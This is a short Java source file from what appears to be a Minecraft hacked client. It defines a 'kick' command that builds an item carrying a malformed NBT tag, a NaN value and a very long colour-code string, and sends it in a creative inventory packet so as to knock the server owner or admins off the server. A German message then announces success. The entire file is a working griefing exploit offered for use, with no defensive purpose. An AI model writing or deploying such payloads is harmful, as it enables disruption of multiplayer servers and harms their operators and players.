package me.bratwurst.module.Commands;


import me.bratwurst.manager.Command;
import me.bratwurst.utils.player.PlayerUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;

public class kickadmin extends Command {
    public kickadmin() {
        super("kick", "kick", "kickadmin");
    }

    @Override
    public void onCommand(String command, String[] args) {
        ItemStack itm = new ItemStack(Item.getItemById(122));
        NBTTagCompound kick = new NBTTagCompound();
        kick.setDouble("adminkicker", Double.NaN);

        String kicked = "";
        for(int i = 0; i < 900; i++){
            kicked += "§c§l     ";
        }
        kick.setString("z", kicked);
        itm.setTagCompound(kick);
        Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itm));
        PlayerUtils.sendMessage("Der Owner wurde vom Server geworfen!");
      }
    }